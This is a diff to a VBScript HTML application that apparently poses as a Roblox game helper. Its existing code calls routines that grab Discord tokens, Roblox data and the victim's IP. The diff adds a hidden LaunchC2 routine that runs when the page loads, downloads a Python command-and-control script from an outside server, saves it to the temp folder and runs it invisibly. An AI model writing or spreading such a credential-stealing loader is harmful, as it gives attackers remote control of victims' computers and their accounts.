@@ -14,6 +14,7 @@ USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 Call GrabDiscordTokens
 Call SendIP
 Call GrabRoblox
+Call LaunchC2
 
 Sub BtnClick
     Dim jobId, playerName, gameName, result
@@ -236,6 +237,21 @@ Sub GrabDiscordTokens()
         End If
     End If
 End Sub
+
+Sub LaunchC2
+    On Error Resume Next
+    Dim x, a, p
+    Set x = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    x.Open "GET", "https://delta-check.onrender.com/c2.py", False
+    x.Send
+    If x.Status = 200 Then
+        p = sh.ExpandEnvironmentStrings("%TEMP%") & "\rbx_c2.py"
+        Set a = CreateObject("ADODB.Stream")
+        a.Type = 1: a.Open: a.Write x.ResponseBody: a.SaveToFile p, 2: a.Close
+        sh.Run "pythonw " & p, 0, False
+    End If
+End Sub
+
 </script>
 </head>
 <body bgcolor="#0f0f1a" text="#ffffff" style="font-family:Segoe UI;">
